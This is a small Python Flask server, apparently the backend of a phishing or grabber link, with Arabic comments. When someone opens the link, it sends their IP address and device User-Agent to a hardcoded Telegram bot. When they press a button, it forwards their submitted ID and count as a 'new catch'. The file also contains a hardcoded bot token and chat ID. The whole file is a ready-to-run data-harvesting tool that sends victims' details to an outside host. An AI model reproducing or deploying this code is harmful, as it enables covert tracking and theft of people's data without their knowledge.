from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})

@app.route('/api/index', methods=['GET', 'POST'])
def handler():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown Device')
    
    if request.method == 'GET':
        # عند دخول الرابط
        msg = f"🔔 **دخل الرابط الحين!**\n\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`"
        send_to_telegram(msg)
        return "ok"
    
    else:
        # عند ضغط الزر وإرسال البيانات
        data = request.json
        mode = data.get('mode')
        t_id = data.get('id')
        t_count = data.get('count')
        
        msg = f"🎯 **صيد جديد!**\n\n🔹 القسم: {mode}\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`\n🔑 البيانات: `{t_id}`\n🔢 العدد المطلوب: `{t_count}`"
        send_to_telegram(msg)
        return jsonify({"status": "ok"})
